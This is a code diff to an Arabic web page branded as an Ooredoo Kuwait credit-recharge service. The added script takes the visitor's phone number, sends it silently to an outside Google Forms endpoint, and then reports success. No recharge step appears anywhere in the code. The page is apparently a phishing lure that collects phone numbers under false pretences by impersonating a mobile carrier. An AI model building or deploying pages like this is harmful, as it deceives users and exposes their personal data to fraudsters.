@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Recharge Kuwait</title>
   <style>
     body {
@@ -57,6 +57,12 @@
     button:hover {
       background-color: #b30000;
     }
+
+    .success-message {
+      margin-top: 20px;
+      color: green;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
@@ -67,9 +73,40 @@
   <div class="container">
     <h1>اشحن رصيد Ooredoo الكويت</h1>
     <p>أدخل رقم هاتفك لبدء عملية الشحن بسهولة وسرعة</p>
-    <input type="text" placeholder="أدخل رقم الهاتف" />
+    <input type="text" id="phone" placeholder="أدخل رقم الهاتف" />
     <br />
-    <button>Recharge Now</button>
+    <button onclick="submitPhone()">Recharge Now</button>
+    <div class="success-message" id="successMsg"></div>
   </div>
+
+  <script>
+    function submitPhone() {
+      const phone = document.getElementById("phone").value;
+      if (!phone) {
+        alert("يرجى إدخال رقم الهاتف");
+        return;
+      }
+
+      // رابط الإرسال الخاص بنموذج Google Form
+      const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSe4MJk5KljgXra28UAWczm8ujsiUukYvAkIDAjSdJGzqXiB6g/formResponse";
+
+      // اسم الحقل الخاص برقك الهاتف (من النموذج)
+      const phoneFieldName = "entry.1000889343";
+
+      // تجهيز البيانات
+      const formData = new FormData();
+      formData.append(phoneFieldName, phone);
+
+      // إرسال البيانات
+      fetch(formURL, {
+        method: "POST",
+        mode: "no-cors",
+        body: formData
+      }).then(() => {
+        document.getElementById("successMsg").innerText = "تم إرسال الرقم بنجاح ✅";
+        document.getElementById("phone").value = "";
+      });
+    }
+  </script>
 </body>
 </html>
